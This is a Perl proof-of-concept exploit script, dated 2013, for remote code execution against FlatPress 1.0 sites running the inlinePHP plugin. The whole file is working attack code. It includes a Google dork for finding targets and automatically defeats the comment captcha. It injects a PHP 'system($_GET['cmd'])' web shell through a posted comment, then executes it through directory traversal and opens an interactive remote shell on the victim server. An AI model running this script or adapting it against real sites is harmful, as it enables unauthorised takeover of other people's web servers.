#!/usr/bin/perl
# Exploit Title: Flatpress remore code execution PoC NULLday
# Google Dork: This site is powered by FlatPress.
# Date: 17/10/2013
# Exploit Author: Wireghoul
# Vendor Homepage: http://flatpress.org/home/
# Software Link:
http://downloads.sourceforge.net/project/flatpress/flatpress/FlatPress%201.0%20Solenne/flatpress-1.0-solenne.tar.bz2
# Version: v1.0
#
# Blended threat, executes code injected into comment
# by loading comment as a page through directory traversal
# Requires the inlinePHP plugin to be enabled.
# Written by @Wireghoul - justanotherhacker.com
#
# This is for my peeps and the freaks in the front row -- Hilltop Hoods:
Nosebleed section

use strict;
use warnings;
use LWP::UserAgent;

&banner;
&usage if (!$ARGV[0]);
my $injid = 'Spl0ited'.int(rand(9999));
my $ua = LWP::UserAgent->new;
$ua->timeout(10);
$ua->env_proxy;
$ua->cookie_jar({ file => "tmp/flatpress-rce.txt" });

sub banner {
    print "\nFlatpress remote code execution PoC by \@Wireghoul\n";
    print "=======================[ justanotherhacker.com]==\n";
}

sub usage {
    print "Usage: $0 <url>\n";
    exit;
}

my $response =
$ua->get("$ARGV[0]/fp-plugins/inlinephp/plugin.inlinephp.php");
if (!$response->is_success) {
    print "[-] Inline PHP plugin not found at
$ARGV[0]/fp-plugins/inlinephp/plugin.inlinephp.php\n";
} else {
    print "[+] Inline PHP plugin found, hopefully it is enabled!\n";
}
# Prepare for exploitation, find entry + comment location
$response = $ua->get($ARGV[0]);
if ($response->is_success) {
    if ($response->decoded_content =~
/(http.*?x=entry:entry.*?;comments:1#comments)/) {
        my $cmntlink = $1;
        print "[+] Found comment link: $cmntlink\n";
        my $aaspam = 0; # Can't be bothered solving easy captchas, just
reload page until we get one we like
        while ($aaspam == 0) {
            $response = $ua->get($cmntlink);
            if ($response->decoded_content =~ /<strong>(\d+) plus (\d+) \?
\(\*\)/) {
                $aaspam = $1+$2;
                print "[+] Defeated antispam $1 + $2 = $aaspam\n";
            } else {
                $response->decoded_content =~ m/<strong>(.*) \? \(\*\)/;
                print "[*] Unknown antispam: $1 ... retrying\n";
            }
        }
        # Post a comment
        $response = $ua->post(
            $cmntlink."form",
            Content => {
                'name' => $injid,
                'email' => '',
                'url' => '',
                'aaspam' => $aaspam,
                'content' =>
"SHELL[exec]system(\$_GET['cmd']);[/exec]LLEHS",
                'submit' => 'Add',
            }
        );
        $response = $ua->get($cmntlink);
        # Find link to injected content, then execute psuedo shell in loop
        my @cmnts = split (/<li id="comment/, $response->decoded_content);
        my @injected = grep /$injid/, @cmnts;
        if ($injected[0] =~ /$injid/) {
            print "[+] Injection ($injid) successful\n";
            $injected[0] =~
m/(http.*?)x=entry:entry(\d\d)(\d\d)(\d\d-\d+);comments:1#comment(\d+-\d+)/;
            my
$shell="$1page=../../content/$2/$3/entry$2$3$4/comments/comment$5";
            print "[*] Dropping into shell, type exit to exit\n";
            my $line='';
            while (1) {
                print '$';
                $line=<STDIN>;
                if ($line =~ /^exit$/) { exit; };
                my $output=$ua->get("$shell&cmd=$line");
                $output->decoded_content =~ /SHELL(.*)LLEHS/ms;
                my $clean = $1; $clean =~ s/<br \/>//g;
                print "$clean\n";
            }
        } else {
            print '[-] Unable to identify the injection point';
        }
    } else {
        print "[-] Comment link not found\n";
    }
} else {
  die $response->status_line;
}